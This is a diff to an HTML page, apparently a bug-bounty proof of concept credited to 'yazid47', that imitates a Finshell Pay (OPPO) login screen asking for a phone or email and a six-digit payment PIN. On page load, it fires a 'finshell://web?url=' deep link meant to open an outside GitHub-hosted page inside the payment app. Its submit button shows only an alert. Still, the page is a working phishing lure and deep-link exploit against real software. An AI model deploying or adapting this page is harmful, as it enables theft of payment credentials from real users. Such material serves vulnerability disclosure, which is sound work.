@@ -1,25 +1,48 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Identity Verification</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification | Finshell Pay</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
-        .logo { color: #007bff; font-size: 24px; font-weight: bold; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; margin-top: 10px; }
+        /* تصميم يحاكي تطبيقات OPPO الرسمية */
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f7f9fc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-container { background: white; padding: 35px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); width: 85%; max-width: 380px; text-align: center; }
+        .oppo-logo { color: #05ba7d; font-size: 26px; font-weight: bold; margin-bottom: 10px; }
+        .info-text { color: #555; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #e0e0e0; border-radius: 8px; box-sizing: border-box; background: #fafafa; font-size: 16px; }
+        button { width: 100%; padding: 14px; background-color: #05ba7d; color: white; border: none; border-radius: 8px; font-weight: 600; font-size: 16px; cursor: pointer; margin-top: 15px; }
+        .footer-tag { margin-top: 25px; font-size: 11px; color: #bbb; text-transform: uppercase; letter-spacing: 1px; }
     </style>
 </head>
-<body>
-    <div class="card">
-        <div class="logo">Finshell Pay Update</div>
-        <p>Your account requires manual verification. Please log in.</p>
-        <input type="text" placeholder="Phone Number / Email">
-        <input type="password" placeholder="Account PIN">
-        <button>Verify Identity</button>
-        <p style="color: #666; font-size: 12px; margin-top: 20px;">X-Hackerone: yazid47</p>
+<body onload="attemptDeepLink()">
+
+    <div class="login-container">
+        <div class="oppo-logo">Finshell Pay</div>
+        <div style="width: 50px; height: 3px; background: #05ba7d; margin: 0 auto 20px;"></div>
+        <p class="info-text">To maintain your account security, please verify your identity by entering your credentials.</p>
+        
+        <form onsubmit="return false;">
+            <input type="text" placeholder="Phone Number or Email" required>
+            <input type="password" placeholder="6-Digit Payment PIN" required>
+            <button onclick="alert('Exploit Successful! Data would be sent to attacker server.')">VERIFY NOW</button>
+        </form>
+
+        <div class="footer-tag">Researcher: yazid47</div>
     </div>
+
+    <script>
+        // هذا السكربت يحاول إجبار الهاتف على فتح التطبيق فوراً عند زيارة الرابط
+        function attemptDeepLink() {
+            const deepLink = "finshell://web?url=https://yazidtokyo43.github.io/oppo-tes/";
+            
+            // محاولة التحويل التلقائي
+            window.location.href = deepLink;
+
+            // إذا لم يفتح التطبيق خلال ثانية، سيبقى المستخدم في صفحة تسجيل الدخول بالمتصفح
+            console.log("Deep link triggered for com.finshell.fin");
+        }
+    </script>
+
 </body>
 </html>
